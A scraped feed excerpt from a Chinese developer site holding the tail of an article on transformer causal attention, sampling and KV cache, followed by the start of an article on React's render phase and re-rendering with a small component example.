style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="mord">1</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<p>将V分块写为V=[v_0, v_1]</p>
<p>最终结果：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>=</mo><mi>P</mi><mi>V</mi><mo>=</mo><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>M</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>M</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi>V</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>0</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>0</mn></msub><msub><mi>v</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>1</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>2</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>2</mn></msub><msub><mi>v</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A=PV=SoftMax(Masked(QK^T))V= \begin{bmatrix} p_0v_0 &amp; p_0v_1 \\ p_1v_0 &amp; p_1v_1 \\ p_2v_0 &amp; p_2v_1 \end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10903em;">tM</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<h5 data-id="heading-5">1.2.2 Final Linear + SoftMax采样</h5>
<p><strong>输入：</strong> 经过Casual Attention后矩阵A，A.shape=(3,2)</p>
<p>此时A无法与E.T进行相乘，所以需要先给A做一次线性变换W_O，W_O.shape=(2,5)</p>
<p>矩阵logitis=AW_OE^T，logits.shape=(6,6)</p>
<p>取logits最后一行进行采样，即SoftMax(logitis[-1])，假定结果为[0.1, 0.1, 0.1, 0.4, 0.1, 0.2]，概率最高的为index=3，为<strong>习</strong></p>
<p><strong>自回归：</strong> 将习加入输入，得到<strong>我爱学习</strong>，将这个句子重新作为输入，重复上面的推理过程，再得到输出 <strong>!</strong></p>
<h3 data-id="heading-6">2. KVCache</h3>
<p>我们重新回顾上面推理过程：</p>
<p><strong>输入1：</strong> 我爱学</p>
<p>通过一系列过程，最后采样得到<strong>习</strong>，将习加入输入</p>
<p><strong>输入2：</strong> 我爱学习</p>
<p>通过一系列过程，最后采样得到 <strong>!</strong> ，将!加入输入，直到最后采样到或者满足其它条件，才终止采样</p>
<p>显然两次输入存在相同的前缀<strong>我爱学</strong>，那么在我们进行第二次推理时，能否利用第一次推理过程中的部分内容呢，从上面的推理过程可以知道两次推理的相同前缀的<strong>K，V</strong>矩阵是完全相同的（甚至Q矩阵也是相同的，但是之前的Q矩阵并没有再利用的价值，所以不需要再进行缓存）</p>
<blockquote>
<p>图片中灰色代表缓存的内容</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ab342a7c62840348f05df882e71b814~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTkwMTkzMDUyNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891734&amp;x-signature=9TshUUbqWvkt%2F5W9y27z2yOM6Hk%3D" alt="image-20260205181445414.png" loading="lazy"/></p>
<h3 data-id="heading-7">3. 参考资料</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fjalammar.github.io%2Fillustrated-transformer%2F" target="_blank" title="https://jalammar.github.io/illustrated-transformer/" ref="nofollow noopener noreferrer">The Illustrated Transformer</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV17CPkeEEzk%2F%3Fspm_id_from%3D333.1007.top_right_bar_window_default_collection.content.click%26vd_source%3D425446e3f98a8c23e0b3e8b615313ea9" target="_blank" title="https://www.bilibili.com/video/BV17CPkeEEzk/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=425446e3f98a8c23e0b3e8b615313ea9" ref="nofollow noopener noreferrer">【8】KV Cache 原理讲解</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[re-render]]></title>    <link>https://juejin.cn/post/7602965400809472050</link>    <guid>https://juejin.cn/post/7602965400809472050</guid>    <pubDate>2026-02-05T10:28:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602965400809472050" data-draft-id="7603054272159023154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="re-render"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T10:28:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tiffany"/> <meta itemprop="url" content="https://juejin.cn/user/3456520291097790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            re-render
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3456520291097790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tiffany
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:28:14.000Z" title="Thu Feb 05 2026 10:28:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">渲染</h2>
<p>那么首先，我们要聊的就是 React 的渲染机制，我们首先要弄清楚在讲 React 渲染的时候，我们具体在说的是什么。</p>
<p>当我们调用 <code>ReactDOM.render(&lt;App /&gt;)</code>（这里就不专门用 <code>createRoot</code> API 了）的时候，或者当我们调用 <code>setState</code> 的时候，React 会从根节点开始重新计算一次整个组件树：</p>
<ol>
<li>React 生成新的 Virtual DOM 树。</li>
<li>并与旧的 Virtual DOM 树做 diff。</li>
<li>得到最终需要应用的更新。</li>
<li>然后执行最小程度的 DOM API 操作。</li>
</ol>
<p>这里面分为两个步骤：</p>
<ul>
<li>render phase，也就是到计算得到最终需要执行的 DOM 更新操作为止的步骤</li>
<li>commit phase，把这些更新 apply 到 DOM 树上</li>
</ul>
<p>而我们要聊的<strong>渲染</strong>就是专门指的第一个步骤，也就是 <strong>render phase</strong>，这个阶段是纯粹的 JS 执行过程，不涉及任何的 DOM 操作。在 React 中，一旦 Virtual Dom diff 的结果确定， 进入 <strong>commit phase</strong> 之后，任务就无法再被打断，而且 commit 的内容是固定的，所以基本也没有什么优化空间。</p>
<p>因此围绕 React 性能优化的话题，基本上都是再 render phase 展开， 所以这篇文章自然也就围绕着 render phase —— 也就是渲染 —— 展开。</p>
<p>ReactDOM.render()一般都是初次渲染时进行的，那么整个节点树中的组件都会执行渲染就没有什么可奇怪的，所以本文主要围绕着更新来讨论， 也就是 <strong>setState</strong>（或者说useState返回的setter）。</p>
<p>我们首先要搞清楚的是当执行setState的时候，React 会做什么。</p>
<p>React 是一个高度遵循 FP（函数编程）的框架，其核心逻辑就是<strong>UI = fn(props &amp; state)</strong> ，这里的fn就是组件，同时也是组件树。 在 React 的设计初期，就是希望组件（树）是一个纯函数，也就是说，组件的输出完全由输入决定，不会受到任何外部因素的影响，这样的好处就是，组件的输出是可预测的，</p>
<p><strong>注意：</strong> 即便是 ClassComponent 时期，React 也不是一个面向对象的框架，React 对待 ClassCompoonent 的核心，仍然是其 render 函数，而 instance 纯粹是用于存储 state 和 props 的。</p>
<h3 data-id="heading-1">基础规则</h3>
<p>默认 React 并没有太多的渲染优化，当我们通过setState触发了一次更新，React 会从根节点开始重新计算一次整个组件树。 是的，你没有看错，<strong>不论你在哪里触发了setState，最终都会导致整个组件树的重新计算</strong>，React 会从根节点开始一次遍历，以计算出最新的 VirtualDomTree。</p>
<p><strong>注意：</strong> 至少在 React16 版本使用 Fiber 重构其 Reconciliation 算法之后是这样的，每次setState更新都会加入到一个更新队列中并且暂存在 root 节点上， 等到这次 event loop 中所有的 update 都进入队列，React 再从根节点上读取改更新队列并开始重新渲染。</p>
<p>除了后面要讲的memo之外，React 默认有也有一项优化，React 渲染虽然是从根节点开始的，但是在遍历过程中如果发现节点本身以及祖先节点没有更新， 而是其子树发生了更新，那么该节点也不会被重新渲染，我们可以来看一下这个例子：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Fgz588t%3Ffile%3D%252Fsrc%252FApp.js%253A20%252C15" target="_blank" title="https://codesandbox.io/p/sandbox/gz588t?file=%2Fsrc%2FApp.js%3A20%2C15" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/g…</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> renderTimes = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> renderTimes++;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;click {count}<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
}

<span class="hljs-keyword">let</span> appRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    {appRenderTime++}
    <span class="hljs-tag">&lt;<span class="hljs-name">Parent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>在这个例子中，state 的更新发生在Parent组件中，而当Parent组件更新导致重新渲染时，虽然Child组件没有任何的 props 和 state 变化， 但其仍然重新渲染了（renderTimes 增加了），相对的App组件却没有重新渲染，这就说明 state 的更新只会导致更新节点的子树重新渲染，并不会影响祖先节点。</p>
